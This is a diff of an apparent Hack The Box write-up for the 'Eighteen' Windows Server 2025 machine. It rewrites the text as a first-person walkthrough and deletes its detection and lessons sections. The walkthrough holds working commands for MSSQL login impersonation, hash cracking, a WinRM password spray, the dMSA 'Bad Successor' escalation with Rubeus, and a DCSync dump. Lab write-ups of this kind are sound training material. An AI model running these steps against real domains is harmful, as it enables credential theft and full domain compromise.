@@ -9,42 +9,20 @@ avatar: assets/htb/eighteen.png
 tags: [windows-server-2025, assume-breach, mssql-impersonation, bad-successor, dmsa, cve-2025-53779, werkzeug-pbkdf2, winrm]
 htb_url: https://app.hackthebox.com/machines/Eighteen
 ---
+
 ## Summary
 
-Eighteen is a **Windows Server 2025 assume-breach** scenario starting with valid MSSQL credentials. The attack uses **MSSQL login impersonation** (`EXECUTE AS LOGIN`) to access a `FinancePlanner` database where the web admin's password is stored as a **Werkzeug PBKDF2-SHA256** hash. The cracked password sprays positively against another domain user with **WinRM** rights. Privilege escalation abuses the **"Bad Successor"** (**CVE-2025-53779**) vulnerability - a flaw in **delegated Managed Service Account (dMSA)** migration on Windows Server 2025 that allows forging keys to impersonate Domain Admin.
+Eighteen is a Windows Server 2025 assume-breach scenario that starts with valid MSSQL credentials. I use MSSQL login impersonation (`EXECUTE AS LOGIN`) to reach a `FinancePlanner` database where the web admin's password is stored as a Werkzeug PBKDF2-SHA256 hash. Cracking that hash gives me a password that sprays positively against another domain user holding WinRM rights. I escalate by abusing the "Bad Successor" vulnerability (CVE-2025-53779), a flaw in delegated Managed Service Account (dMSA) migration on Windows Server 2025 that lets me forge keys to impersonate Domain Admin.
 
----
+## Enumeration
 
-## External Writeups
-
-- [0xdf - HTB Eighteen](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
-
----
-
-## Key Techniques
-
-- MSSQL `EXECUTE AS LOGIN` impersonation (`sysadmin` or `IMPERSONATE` privilege)
-- Werkzeug PBKDF2-SHA256 hash format recognition + `hashcat -m 10900`
-- Password spray with NXC / kerbrute targeting WinRM (port 5985)
-- **CVE-2025-53779** "Bad Successor" - dMSA migration key forgery (Windows Server 2025)
-- dMSA inheritance / msDS-DelegatedMSAState abuse
-- Pure Kerberos lateral movement
-
----
-
-## Attack Path
-
-### 1. Recon & Assumed Breach Entry
-
-Given creds: `eighteen.htb\<user>:<pw>` and MSSQL access to `dc01.eighteen.htb:1433`.
+This is an assume-breach box, so I begin with credentials already in hand: `eighteen.htb\<user>:<pw>`, plus MSSQL access to `dc01.eighteen.htb:1433`. I connect to the SQL Server instance over Windows authentication.
 
 ```bash
 impacket-mssqlclient eighteen.htb/<user>:'<pw>'@dc01.eighteen.htb -windows-auth
 ```
 
-### 2. MSSQL Login Impersonation
-
-Enumerate impersonatable logins:
+Once on the server, I enumerate the server principals and, more importantly, which logins I'm permitted to impersonate. Over-granted `IMPERSONATE` permissions are a routine finding post-foothold, so I always check `sys.server_permissions`.
 
 ```sql
 SELECT name, type_desc FROM sys.server_principals;
@@ -52,11 +30,18 @@ SELECT b.name FROM sys.server_permissions a
 JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
 WHERE a.permission_name = 'IMPERSONATE';
 -- -> sa, finance_app
+```
+
+## Foothold
+
+With `finance_app` available as an impersonation target, I switch my login context and confirm the new identity.
+
+```sql
 EXECUTE AS LOGIN = 'finance_app';
 SELECT SYSTEM_USER;
 ```
 
-Switch DB:
+Now operating as `finance_app`, I switch to the `FinancePlanner` database and read the application's admin table, which stores the web admin's credential as a hash.
 
 ```sql
 USE FinancePlanner;
@@ -64,14 +49,14 @@ SELECT username, password_hash FROM admins;
 -- admin : pbkdf2:sha256:600000$<salt>$<hash>
 ```
 
-### 3. Werkzeug Hash Crack
+The `pbkdf2:sha256:<iter>$<salt>$<hash>` literal prefix is the tell-tale sign of a Werkzeug hash, which hashcat handles with mode 10900.
 
 ```bash
 hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
 # admin : <password>
 ```
 
-### 4. Password Spray to WinRM
+Password reuse between the database and AD is the obvious pivot. I spray the cracked password across the domain users against WinRM and land a hit on a second user.
 
 ```bash
 nxc winrm dc01.eighteen.htb -u users.txt -p '<password>' --continue-on-success
@@ -79,13 +64,15 @@ nxc winrm dc01.eighteen.htb -u users.txt -p '<password>' --continue-on-success
 evil-winrm -i dc01.eighteen.htb -u <user2> -p '<password>'
 ```
 
-### 5. CVE-2025-53779 - Bad Successor (dMSA Migration)
+## Privilege Escalation
 
-On Windows Server 2025, the **dMSA** (delegated MSA) migration flow has a logic flaw: an attacker with **CreateChild** rights on an OU (or specific ACLs over a dMSA object) can:
+Escalation abuses CVE-2025-53779, the "Bad Successor" flaw in the Windows Server 2025 dMSA (delegated MSA) migration flow. The logic flaw means an attacker with CreateChild rights on an OU (or specific ACLs over a dMSA object) can:
 
 1. Create or modify a dMSA pointing to a privileged predecessor
 2. Trigger a migration sequence that forges the new dMSA's keys based on the predecessor's identity
-3. The KDC then issues TGTs honoring the **predecessor's** group memberships - including Domain Admins
+3. Have the KDC then issue TGTs honoring the predecessor's group memberships - including Domain Admins
+
+I confirm my ACL position over the dMSA, drive the migration by setting `msDS-DelegatedMSAState`, and request a TGT for the dMSA, which inherits the predecessor's PAC.
 
 ```powershell
 # Verify ACL position
@@ -96,25 +83,8 @@ Set-ADComputer dmsa1 -Replace @{ "msDS-DelegatedMSAState" = 2 }
 Rubeus.exe asktgt /user:dmsa1$ /aes256:<key> /domain:eighteen.htb /dc:dc01.eighteen.htb /ptt
 ```
 
-With Domain Admin PAC, run DCSync:
+With a Domain Admin PAC in hand, I run DCSync to dump the domain's secrets.
 
 ```bash
 impacket-secretsdump eighteen.htb/dmsa1\$@dc01.eighteen.htb -k -no-pass
 ```
-
----
-
-## Lessons Learned
-
-- **Windows Server 2025 dMSA** is a brand-new attack surface; "Bad Successor" turned a migration feature into a credential-forgery primitive within months of GA.
-- **MSSQL `IMPERSONATE` permissions** are routinely over-granted - always enumerate `sys.server_permissions` post-foothold.
-- **Werkzeug** is recognisable by the `pbkdf2:sha256:<iter>$<salt>$<hash>` literal prefix - hashcat `-m 10900`.
-- Password reuse across DB and AD remains the #1 pivot vector in 2026.
-
----
-
-## Detection
-
-- KDC events 4768 / 4769 for newly-created dMSA accounts with privileged group SIDs in the PAC.
-- LDAP modifications to `msDS-DelegatedMSAState`, `msDS-ManagedAccountPrecededByLink`, `msDS-GroupMSAMembership`.
-- MSSQL audit: `EXECUTE AS LOGIN` calls followed by sensitive table reads.
